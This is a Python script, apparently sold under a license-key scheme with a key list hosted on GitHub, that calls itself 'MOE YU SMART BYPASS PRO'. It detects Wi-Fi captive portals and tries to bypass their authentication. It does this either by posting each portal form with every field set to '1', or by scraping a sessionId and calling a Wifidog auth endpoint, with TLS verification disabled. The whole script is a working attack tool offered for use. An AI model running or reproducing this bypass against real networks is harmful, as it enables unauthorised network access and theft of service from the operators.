import requests
import re
import urllib3
import time
import threading
import logging
import random
import sys
import datetime
import os
import uuid
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

PING_THREADS = 5  # တည်ငြိမ်မှုအတွက် 5 ထားပေးလိုက်ပါတယ်
stop_event = threading.Event()
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# COLOR SYSTEM
GREEN = "\033[92m"
RESET = "\033[0m"

# LOGO & BANNER
BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Let's Play! )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def display_hacker_flag():
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU SMART BYPASS PRO v6.0[/bold cyan]\n"))

def simpler_hacker_typing(text, style="bold green"):
    console.print("[bold #00FF00]>>> [/bold #00FF00]", end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.02)
    console.print()

def success_fireworks():
    for _ in range(15):
        fire = " " * random.randint(1, 45) + random.choice(["✨", "💥", "🌟", "⭐"])
        console.print(Text(fire, style=random.choice(["yellow", "cyan", "green", "white"])))
        time.sleep(0.01)

def check_license_hacker_style():
    my_hwid = get_hwid()
    console.clear()
    display_hacker_flag()
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[bold red]DEVICE INFO[/bold red]", border_style="bold cyan", expand=False)))
    try: user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    except: sys.exit()
    if not user_key: sys.exit()
    try:
        res = requests.get(URL, timeout=10)
        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
        for entry in lines:
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print("\n[bold red]❌ HWID MISMATCH![/bold red]")
                    sys.exit()
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                if is_active:
                    success_fireworks()
                    simpler_hacker_typing("ACCESS_GRANTED: AUTHENTICATION SUCCESS")
                    console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                    return True
        console.print("\n[bold red]❌ INVALID KEY![/bold red]")
        sys.exit()
    except:
        console.print("\n[bold red]📡 CONNECTION ERROR![/bold red]")
        sys.exit()

# ===============================
# SMART BYPASS ENGINE
# ===============================
def start_bypass_process():
    while not stop_event.is_set():
        try:
            session = requests.Session()
            # 1. စမ်းကြည့်မယ်
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            if r.status_code == 204:
                time.sleep(10)
                continue
            
            portal_url = r.url
            r_page = session.get(portal_url, timeout=10, verify=False)
            soup = BeautifulSoup(r_page.text, 'html.parser')
            form = soup.find('form')

            # --- CASE 1: Old Router (Form/POST ရှိရင်) ---
            if form:
                action = form.get('action')
                full_action_url = requests.compat.urljoin(portal_url, action)
                payload = {}
                for input_tag in form.find_all('input'):
                    name = input_tag.get('name')
                    if name: payload[name] = "1" 
                
                session.post(full_action_url, data=payload, verify=False)
                console.print(f"[yellow][!] Found Form. Trying POST bypass...[/yellow]")

            # --- CASE 2: New Router (Wifidog/GET) ---
            else:
                path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r_page.text)
                next_url = requests.compat.urljoin(portal_url, path_match.group(1)) if path_match else portal_url
                
                r2 = session.get(next_url, timeout=10, verify=False)
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                
                if sid_match:
                    sid = sid_match.group(1)
                    auth_link = f"http://192.168.60.1:2060/wifidog/auth?token={sid}"
                    session.get(auth_link, timeout=5)
                    console.print(f"[green][✓] Wifidog bypass active.[/green]")

            time.sleep(10)
        except:
            time.sleep(5)

if __name__ == "__main__":
    if check_license_hacker_style():
        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
        try: start_bypass_process()
        except KeyboardInterrupt: sys.exit()
